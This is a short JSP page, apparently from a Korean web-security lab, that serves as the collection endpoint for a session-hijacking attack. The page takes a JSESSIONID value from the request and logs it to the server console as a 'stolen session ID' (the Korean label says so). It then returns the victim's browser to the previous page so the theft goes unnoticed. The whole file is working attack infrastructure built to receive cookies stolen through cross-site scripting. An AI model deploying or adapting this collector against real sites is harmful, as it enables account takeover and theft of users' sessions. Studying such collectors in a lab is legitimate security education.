<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8">
		<title>Insert title here</title>
	</head>
	<body>
		<%
			String sessionId = request.getParameter("JSESSIONID");
			// Catalina.txt에 확실히 찍히도록 System.out.println 사용
			System.out.println("탈취된 세션 ID: " + sessionId); 
		%>
		
		<script>history.back();</script>
	</body>
</html>